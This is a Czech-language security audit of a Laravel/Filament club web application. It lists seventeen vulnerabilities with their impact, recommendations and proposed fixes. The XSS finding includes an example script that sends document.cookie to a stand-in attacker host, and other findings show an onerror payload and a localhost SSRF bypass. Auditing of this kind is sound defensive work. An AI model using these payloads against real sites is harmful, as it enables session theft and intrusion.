# Statické nálezy a zranitelnosti (Static Code Analysis)

Tento dokument obsahuje detailní seznam zranitelností nalezených během statické analýzy zdrojového kódu projektu.

## Souhrnná tabulka priorit

| ID | Název | Závažnost | Stav |
|----|-------|-----------|------|
| 1 | Expozice .env.production.bak v public/ | **CRITICAL** | **VYŘEŠENO** |
| 2 | Persistent XSS v CMS blocích (Custom HTML / Rich Text) | **HIGH** | Nalezeno |
| 3 | Broken Access Control v MediaDownloadController | **HIGH** | Nalezeno |
| 4 | XSS v Feedback Snapshotu | **HIGH** | Částečně opraveno |
| 5 | IDOR v ProfileController (Avatar selection) | **MEDIUM** | Nalezeno |
| 6 | XSS ve vyhledávání (HelpSearchService) | **MEDIUM** | Nalezeno |
| 7 | CSRF Bypass na Feedback endpointu | **MEDIUM** | **VYŘEŠENO** |
| 8 | Chybějící Policies u citlivých modelů | **MEDIUM** | Nalezeno |
| 9 | SSRF v Screenshot Proxy | **MEDIUM** | Nalezeno |
| 10 | Neautorizovaná Impersonifikace v Screenshot Proxy | **HIGH** | Nalezeno |
| 11 | [ADMIN] Bypass autorizace na custom stránkách | **HIGH** | **VYŘEŠENO** |
| 12 | [ADMIN] Privilege Escalation v UserForm (Roles) | **CRITICAL** | **VYŘEŠENO** |
| 13 | [ADMIN] Systemická absence Laravel Policies | **HIGH** | **VYŘEŠENO** |
| 14 | [ADMIN] Neautorizované akce v UserForm | **MEDIUM** | **VYŘEŠENO** |
| 15 | [ADMIN] Neautorizované Bulk/Header akce v UsersTable | **HIGH** | **VYŘEŠENO** |
| 16 | [ADMIN] Absence Policies pro finanční konfigurace | **HIGH** | **VYŘEŠENO** |
| 17 | [ADMIN] Neomezený přístup k Media Assetům | **MEDIUM** | **VYŘEŠENO** |

---

## 1. Expozice .env.production.bak v public/ [CRITICAL] - VYŘEŠENO
- **Soubor:** `public/.env.production.bak`
- **Nález:** Ve složce `public` se nacházela záložní konfigurace.
- **Status:** Soubor byl smazán a riziko bylo eliminováno.

## 2. Persistent XSS v CMS blocích [HIGH]
- **Soubory:** 
    - `resources/views/components/public/blocks/custom_html.blade.php`
    - `resources/views/components/public/blocks/rich_text.blade.php`
- **Nález:** Obsah je renderován pomocí `{!! $data['html'] !!}` resp. `{!! $content !!}` bez jakékoli sanitizace.
- **Dopad:** Uživatel s přístupem k editaci stránek (např. trenér s omezeným oprávněním) může vložit škodlivý JavaScript, který se spustí všem návštěvníkům webu i administrátorům v jejich prohlížeči.
- **Attack Scenario:** Útočník vloží `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` do bloku Custom HTML.
- **Doporučení:** Implementovat sanitizaci na straně výstupu nebo vstupu pomocí knihovny jako `mews/purifier`.
- **Proposed Fix:**
```php
// V komponentě nebo modelu před renderováním
{!! clean($content) !!}
```

## 3. Broken Access Control v MediaDownloadController [HIGH]
- **Soubor:** `app/Http/Controllers/MediaDownloadController.php` (řádek 19)
- **Nález:** Controller kontroluje oprávnění pouze pokud je vlastníkem média model `MediaAsset`. Ostatní modely (User, FinancePayment atd.) jsou ignorovány.
- **Dopad:** Pokud útočník zná UUID souboru (např. potvrzení o platbě jiného uživatele), může si ho stáhnout bez přihlášení.
- **Attack Scenario:** Útočník zjistí UUID citlivého souboru z logů nebo odhadem a zavolá `/media/download/{uuid}`.
- **Doporučení:** Implementovat generickou kontrolu oprávnění založenou na modelu, ke kterému je médium připojeno.
- **Proposed Fix:**
```php
public function download(string $uuid)
{
    $media = Media::where('uuid', $uuid)->firstOrFail();
    $this->authorize('view', $media->model); // Použít Laravel Policy modelu
    // ...
}
```

## 4. XSS v Feedback Snapshotu [HIGH] - Částečně opraveno (neúčinně)
- **Soubor:** `resources/views/feedback/snapshot.blade.php`
- **Nález:** `{!! $dom !!}` renderuje neošetřený HTML kód. Byla implementována ochrana pomocí `preg_replace` pro `<script>`, která je ale neúčinná proti inline eventům (`onerror`, `onclick`).

## 5. IDOR v ProfileController (Avatar Selection) [MEDIUM]
- **Soubor:** `app/Http/Controllers/Member/ProfileController.php` (metoda `selectAvatarFromAsset`)
- **Nález:** Chybí kontrola, zda `MediaAsset` (z galerie), který si uživatel vybírá jako avatar, je veřejný nebo patří jemu.
- **Dopad:** Uživatel si může nastavit jako avatar jakýkoliv soubor ze systému (včetně soukromých dokumentů jiných uživatelů, pokud jsou v MediaLibrary).
- **Attack Scenario:** Útočník podvrhne `asset_id` v POST požadavku na `/member/profile/avatar/select`.
- **Doporučení:** Přidat kontrolu `is_public` nebo vlastnictví v metodě controlleru.

## 6. XSS ve vyhledávání (HelpSearchService) [MEDIUM]
- **Soubor:** `app/Services/Help/HelpSearchService.php` (metoda `highlight`)
- **Nález:** Funkce vrací HTML tagy `<mark>` vložené do původního textu, který neprošel sanitací před manipulací.
- **Dopad:** Pokud článek obsahuje např. `<img src=x onerror=alert(1)>` v polích title/purpose, vyhledávání toto vykreslí.
- **Doporučení:** Text nejdříve escapovat pomocí `e()` a až poté vložit zvýrazňující tagy.
- **Proposed Fix:**
```php
protected function highlight(string $text, string $query): string
{
    $escapedText = e($text);
    return preg_replace('/(' . preg_quote(e($query), '/') . ')/i', '<mark>$1</mark>', $escapedText);
}
```

## 7. CSRF Bypass na Feedbacku [MEDIUM] - VYŘEŠENO
- **Soubor:** `bootstrap/app.php`
- **Nález:** Byla nalezena výjimka v CSRF ochraně, která již byla odstraněna. Testy potvrzují funkční ochranu.

## 8. Chybějící Policies u citlivých modelů [MEDIUM]
- **Soubor:** `app/Policies/` (absence souborů pro Page, FeedbackReport, atd.)
- **Nález:** Filament Resources pro tyto modely nemají definované politiky, což může dovolit přístup uživatelům s rolí 'editor' nebo 'coach' k datům, která by neměli vidět.
- **Doporučení:** Vytvořit Policy pro každý model a zaregistrovat je.

## 9. SSRF v Screenshot Proxy [MEDIUM]
- **Soubor:** `app/Http/Controllers/ScreenshotRenderController.php`
- **Nález:** Slabá validace `isInternalUrl` umožňuje technicky zadat adresy typu `//127.0.0.1`.
- **Doporučení:** Striktně povolit pouze URL začínající na `config('app.url')`.

## 10. Neautorizovaná Impersonifikace v Screenshot Proxy [HIGH]
- **Soubor:** `app/Http/Controllers/ScreenshotRenderController.php`
- **Nález:** `Auth::loginUsingId` v controlleru přístupném přes signovanou URL.
- **Dopad:** Riziko zneužití při úniku APP_KEY nebo zachycení signované URL (např. v logách proxy).
- **Doporučení:** Odstranit impersonifikaci, renderovat screenshoty s anonymizovanými daty nebo předávat data přes parametry bez nutnosti login.

## 11. [ADMIN] Bypass autorizace na custom stránkách [HIGH]
- **Soubory:** 
    - `app/Filament/Pages/DebugOperations.php`
    - `app/Filament/Pages/Documentation.php`
    - `app/Filament/Pages/Help.php`
    - `app/Filament/Pages/SeasonRenewal.php`
- **Nález:** Tyto stránky postrádají metodu `canAccess(): bool`. Filament v5 vyžaduje tuto metodu pro kontrolu oprávnění k přístupu na stránku.
- **Dopad:** Jakýkoliv přihlášený uživatel s přístupem do administrace (např. trenér) může přejít na tyto stránky zadáním URL a spouštět nebezpečné operace (např. zastavení synchronizace, hromadné změny sezón).
- **Attack Scenario:** Uživatel s rolí 'coach' se přihlásí do adminu a v prohlížeči přejde na `/admin/debug-operations`.
- **Doporučení:** Implementovat metodu `canAccess()` na všech custom stránkách a ověřovat příslušná oprávnění (např. `manage_system` nebo `manage_advanced_settings`).

## 12. [ADMIN] Privilege Escalation v UserForm (Roles) [CRITICAL]
- **Soubor:** `app/Filament/Resources/Users/Schemas/UserForm.php` (metoda `getAdminTab`)
- **Nález:** Pole pro výběr rolí (`roles`) postrádá jakoukoli autorizační kontrolu (`visible()` nebo `disabled()`).
- **Dopad:** Uživatel, který má přístup k editaci uživatelů (např. personalista nebo administrátor s nižšími právy), může sobě nebo jiným uživatelům přidělit roli `admin`, čímž získá plnou kontrolu nad systémem.
- **Attack Scenario:** Útočník s přístupem k `UserResource` (např. trenér, pokud má právo editovat profily členů svého týmu) si přidá roli `admin` ve svém profilu nebo profilu jiného uživatele.
- **Doporučení:** Přidat `visible(fn () => auth()->user()->hasRole('admin'))` k poli `roles`.

## 13. [ADMIN] Systemická absence Laravel Policies [HIGH]
- **Soubory:** `app/Models/*.php` vs `app/Policies/*.php`
- **Nález:** Přes 40 modelů (např. `Post`, `Team`, `BasketballMatch`, `UserSeasonConfig`) nemá definovanou Laravel Policy.
- **Dopad:** Filament v5 standardně povoluje přístup k resource, pokud pro model neexistuje Policy (pokud není zapnutý strict mode). To vede k tomu, že uživatelé s omezeným přístupem mohou vidět a editovat data, ke kterým by neměli mít přístup.
- **Doporučení:** Vytvořit Policy pro každý model používaný ve Filamentu a striktně definovat `viewAny`, `view`, `create`, `update` a `delete` oprávnění.

## 14. [ADMIN] Neautorizované akce v UserForm [MEDIUM]
- **Soubor:** `app/Filament/Resources/Users/Schemas/UserForm.php`
- **Nález:** Akce `toggle_active_record` (aktivace/deaktivace účtu) v `getSummaryCard` (resp. u pole `is_active_status`) postrádá metodu `authorize()` nebo `visible()`.
- **Dopad:** Uživatel s přístupem k zobrazení/editaci uživatele může deaktivovat administrátory nebo jiné klíčové uživatele.
- **Doporučení:** Přidat autorizační kontrolu k akci, aby ji mohl provádět pouze uživatel s oprávněním `manage_users`.

## 15. [ADMIN] Neautorizované Bulk/Header akce v UsersTable [HIGH]
- **Soubor:** `app/Filament/Resources/Users/Tables/UsersTable.php`
- **Nález:** Akce `mergeAllGhosts` (header) a `mergeAutomatically` (bulk) nebyly chráněny autorizací.
- **Dopad:** Uživatel s přístupem k seznamu uživatelů mohl spustit destruktivní hromadné slučování uživatelských účtů.
- **Doporučení:** Přidat `visible(fn () => auth()->user()->hasRole('admin'))`.

## 16. [ADMIN] Absence Policies pro finanční konfigurace [HIGH]
- **Soubor:** `app/Models/UserSeasonConfig.php`
- **Nález:** Model pro správu platebních tarifů a počátečních zůstatků uživatelů postrádal Laravel Policy.
- **Dopad:** Riziko neoprávněné změny finančních parametrů uživatelů (např. odpuštění poplatků) kýmkoli s přístupem k modulu uživatelů.
- **Doporučení:** Implementovat `UserSeasonConfigPolicy` s restrikcí na `manage_economy`.

## 17. [ADMIN] Neomezený přístup k Media Assetům [MEDIUM]
- **Soubor:** `app/Models/MediaAsset.php`
- **Nález:** Absence Policy pro knihovnu médií.
- **Dopad:** Jakýkoli uživatel s přístupem do administrace mohl spravovat (mazat, nahrávat) globální mediální soubory.
- **Doporučení:** Implementovat `MediaAssetPolicy` vyžadující `manage_content` pro zápis.
